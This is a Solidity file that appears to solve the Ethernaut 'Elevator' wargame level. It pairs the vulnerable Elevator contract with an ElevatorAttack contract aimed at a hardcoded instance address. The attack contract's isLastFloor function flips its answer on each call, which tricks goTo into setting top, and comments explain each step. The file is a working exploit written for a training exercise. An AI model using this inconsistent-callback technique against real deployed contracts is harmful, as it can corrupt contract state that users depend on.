pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttack is Building{
    address instanceAddress = 0x764fd9c17e994dbbd251764e4c53cb2fee3a37b1; //insert desired instance address here
    Elevator elevator;// initialise elevator contract for attack
    bool lastFloor = true;
    // Basically goTo says that if the entered floor is not the last floor, it will enter the if condition
    // hence, isLastFloor() needs to return false to enter the if loop
    // We need to set the lastFloor = true due to reasons elaborated on the isLastFloor() function
    
    constructor() public {
        elevator = Elevator(instanceAddress);
        // here, the key idea is that the ElevatorAttack contract is an implementation of Building.
        // By instantiating the Elevator class here, we force the Elevator class to use our malicious completed isLastFloor() method
    }
    function isLastFloor(uint _floor) view public returns (bool){ //note that the floor here is useless, we need it to instantiate our function
        // here, we MUST NOTE that the isLastFloor() method is called twice at the goTo() method
        // While we want the boolean value that enters the loop to be false, we want the boolean value after it is called the second time to be true
        // hence, we need to alternate the values of last floor to achieve our goal
        lastFloor = !lastFloor;
        return lastFloor;
    }
    function exploit() public {
        elevator.goTo(11); //any value for the level will work
    }
}